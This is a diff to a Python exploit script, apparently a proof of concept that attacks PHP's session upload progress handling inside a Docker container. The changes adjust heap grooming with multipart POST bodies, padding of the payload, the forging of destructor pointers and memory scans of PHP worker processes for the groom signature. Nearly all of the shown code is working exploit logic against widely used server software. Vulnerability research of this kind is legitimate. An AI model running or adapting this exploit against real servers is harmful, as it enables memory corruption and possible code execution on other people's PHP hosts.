@@ -110,9 +110,10 @@ def dump_windows(cpid, addr, n):
 def main():
     mode = sys.argv[1] if len(sys.argv) > 1 else "full"
     tag = sys.argv[2] if len(sys.argv) > 2 else "r1"
+    chunk_override = int(sys.argv[3], 0) if len(sys.argv) > 3 else None
     _benign = mode.startswith("benign")
     cpid = sh(["docker", "inspect", "-f", "{{.State.Pid}}", CTNR])
-    bias = int(memtool("libphp-bias", cpid, "53"), 16)
+    bias = int(memtool("libphp-bias", cpid, "1"), 16)
     bg = bias + BG_VA
     log(f"=== round {tag}: cpid={cpid} bias={bias:#x} basic_globals={bg:#x}")
     base = dump_windows(cpid, bg, BG_LEN)
@@ -131,7 +132,8 @@ def main():
         import groom as g0
         base = 0xfa2f0ea6a000
         payload = g0.build_payload(base, bias + 0xf22000, bias)
-        comb = b"F" * 430080 + payload
+        comb = payload + b"F" * (430080 - len(payload))
+        log(f"place: comb={len(comb)}B filler=430080 payload_base=0xfa2f0ea6a000(expected)")
         cons = pb([part(b"g", comb),
                    part(b"PHPSESSID", sid_b.encode()),
                    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc2"),
@@ -141,24 +143,20 @@ def main():
         log(f"place: t={dt:.1f}s len={len(r)} tail={r[-30:]!r}")
         s.close()
         time.sleep(0.3)
-        dchunk = 0xfa2f0ea6a000
+        pat = struct.pack("<Q", bias + 0xf20000).hex()
         for pid in [int(p) for p in memtool("children", cpid).split()]:
             try:
-                hx = memtool("read", cpid, str(pid), hex(dchunk), "32")
-                b = bytes.fromhex(hx)
-                l2v = struct.unpack_from("<Q", b, 0)[0]
-                if l2v == bias + 0xf20000:
-                    log(f"place: pid={pid} GROOM AT d_chunk "
-                        f"(last={l2v:#x}) ✓✓✓")
-                else:
-                    log(f"place: pid={pid} d_chunk head={b[:16].hex()} "
-                        f"(last={l2v:#x}) - no groom")
+                region = chunk_override or 0xfa2f0ea00000
+                hits = memtool("find", cpid, str(pid), hex(region),
+                               "2097152", pat)
+                log(f"place: pid={pid} groom-sig hits: {hits}")
             except Exception as e:
-                log(f"place: pid={pid} read fail {e}")
+                log(f"place: pid={pid} scan fail {e}")
         return
     s = socket.create_connection((HOST, PORT), timeout=30)
     s = socket.create_connection((HOST, PORT), timeout=30)
-    prod = pb([part(b"PHPSESSID", sid_a.encode()),
+    prod = pb([part(b"f", b"F" * 430080),
+               part(b"PHPSESSID", sid_a.encode()),
                part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc"),
                part(b"u", b"x" * 10, filename=b"a.txt")])
     r, dt = send(s, post_head(len(prod)), prod, timeout=120)
@@ -235,7 +233,7 @@ def main():
         struct.pack_into("<Q", payload, 16, ld)    # last_dtor
         payload = bytes(payload)
         log(f"benign mode: dtor ptrs -> {ld:#x}, token poc|i:1;")
-    comb = b"F" * 430080 + payload
+    comb = payload + b"F" * (430080 - len(payload))
     cons = pb([part(b"g", comb),
                part(b"PHPSESSID", sid_b.encode()),
                part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc2"),
